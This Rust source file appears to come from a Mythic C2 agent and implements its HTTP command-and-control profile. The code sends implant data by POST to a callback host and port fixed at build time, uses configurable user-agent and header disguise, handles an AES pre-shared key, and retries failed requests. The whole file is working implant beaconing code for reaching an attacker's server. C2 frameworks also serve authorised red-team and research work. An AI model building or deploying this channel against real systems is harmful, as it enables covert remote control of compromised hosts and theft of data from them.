use crate::profiles::C2Profile;
use base64::{Engine as _, engine::general_purpose};
use std::error::Error;

/// Struct holding information for the HTTP profile
pub struct HTTPProfile {
    callback_host: String,
    aes_key: Option<Vec<u8>>,
}

impl HTTPProfile {
    /// Create a new HTTP C2 profile
    /// * `host` - Host for the C2 connection
    pub fn new(host: &str) -> Self {
        // base64 decode the aes key
        let aes_key = profilevars::aes_key().map(|k| general_purpose::STANDARD.decode(k).unwrap());

        Self {
            aes_key,
            callback_host: host.to_string(),
        }
    }
}

impl C2Profile for HTTPProfile {
    /// Required implementation for sending data to the C2
    fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
        // Send an HTTP post request with the data
        http_post(
            format!(
                "{}:{}/{}",
                self.callback_host,
                profilevars::cb_port(),
                profilevars::post_uri()
            )
            .as_str(),
            data,
        )
    }

    /// Gets the AES key from the HTTPProfile
    fn get_aes_key(&self) -> Option<&Vec<u8>> {
        self.aes_key.as_ref()
    }

    /// Sets the AES key for the HTTPProfile
    fn set_aes_key(&mut self, new_key: Vec<u8>) {
        self.aes_key = Some(new_key);
    }
}

/// Generic http POST wrapper returning the body of the result
/// * `url` - URL for the post request
/// * `body` - Body of the post request
fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
    // Create a new post request with the configured user agent and timeout
    let mut req = minreq::post(url)
        .with_header("User-Agent", profilevars::useragent())
        .with_header("Content-Type", "application/json")
        .with_header("Connection", "keep-alive")
        .with_timeout(30) // 30 second timeout
        .with_body(body);

    // Add any additional headers
    if let Some(headers) = profilevars::headers() {
        for (key, val) in headers.iter() {
            req = req.with_header(key, val);
        }
    }

    // Send the post request with retry logic
    let mut attempts = 0;
    let max_attempts = 3;
    
    loop {
        attempts += 1;
        eprintln!("DEBUG: HTTP request attempt {} to {}", attempts, url);
        
        let res = match req.send() {
            Ok(response) => {
                eprintln!("DEBUG: HTTP request successful, status: {}", response.status_code);
                response
            },
            Err(e) => {
                eprintln!("DEBUG: HTTP request failed to {}: {}", url, e);
                
                if attempts >= max_attempts {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::ConnectionRefused,
                        format!("Failed to make post request to {} after {} attempts: {}. Please check if the Mythic server is running and the URL is correct.", url, max_attempts, e),
                    )
                    .into());
                }
                
                // Wait before retrying
                eprintln!("DEBUG: Retrying in 2 seconds...");
                std::thread::sleep(std::time::Duration::from_secs(2));
                continue;
            }
        };

        // Check the status code
        if res.status_code != 200 {
            if attempts >= max_attempts {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::ConnectionRefused,
                    format!("Failed to make post request to {}: HTTP {} - {}", url, res.status_code, res.reason_phrase),
                )
                .into());
            }
            
            eprintln!("DEBUG: HTTP request failed with status {}, retrying...", res.status_code);
            std::thread::sleep(std::time::Duration::from_secs(2));
            continue;
        }

        // Try to get the response body
        match res.as_str() {
            Ok(response_body) => {
                eprintln!("DEBUG: HTTP response received, length: {} bytes", response_body.len());
                return Ok(response_body.to_string());
            },
            Err(e) => {
                eprintln!("DEBUG: Failed to read response body: {}", e);
                
                if attempts >= max_attempts {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        format!("Failed to read response body from {}: {}", url, e),
                    )
                    .into());
                }
                
                eprintln!("DEBUG: Retrying due to response body read error...");
                std::thread::sleep(std::time::Duration::from_secs(2));
                continue;
            }
        }
    }
}

/// Configuration variables specific to the HTTP C2 profile
pub mod profilevars {
    use serde::{Deserialize, Serialize};
    use std::collections::HashMap;

    // Structure to hold the http header information
    #[derive(Deserialize, Serialize)]
    struct Header {
        name: String,
        key: String,
        value: String,
        custom: Option<bool>,
    }

    // Structure to hold static AES key information
    #[derive(Deserialize, Serialize)]
    struct Aespsk {
        value: String,
        enc_key: Option<String>,
        dec_key: Option<String>,
    }

    // Helper function to get the user agent
    pub fn useragent() -> String {
        // Grab the C2 profile headers from the environment variable `headers`
        let headers: HashMap<String, String> = serde_json::from_str(env!("headers")).unwrap();

        headers
            .get("User-Agent")
            .map(|agent| agent.to_owned())
            .unwrap_or_default()
    }

    // Helper function to get the other headers
    pub fn headers() -> Option<HashMap<String, String>> {
        let mut headers: HashMap<String, String> = serde_json::from_str(env!("headers")).unwrap();
        headers.remove("User-Agent");

        if !headers.is_empty() {
            Some(headers)
        } else {
            None
        }
    }

    // Helper function to get the C2 configured callback host
    pub fn cb_host() -> String {
        // Grab the callback host from the environment variable `callback_host`
        let callback_host = String::from(env!("callback_host"));

        // Debug: Print the callback host being used
        eprintln!("DEBUG: Using callback host: {}", callback_host);

        callback_host
    }

    // Helper function to get the C2 configured callback port
    pub fn cb_port() -> String {
        // Get the callback port from the environment variable `callback_port`
        String::from(env!("callback_port"))
    }

    // Helper function to get the C2 configured get uri
    #[allow(unused)]
    pub fn get_uri() -> String {
        // Grab the get uri from the environment variable `get_uri`
        String::from(env!("get_uri"))
    }

    // Helper function to get the configured post uri
    pub fn post_uri() -> String {
        // Grab the get uri from the environment variable `post_uri`
        String::from(env!("post_uri"))
    }

    // Helper function to get the configured AES key
    pub fn aes_key() -> Option<String> {
        // Grab the AES information from the environment variable `AESPSK`
        let aes: Aespsk = serde_json::from_str(env!("AESPSK")).unwrap();
        aes.enc_key
    }
}
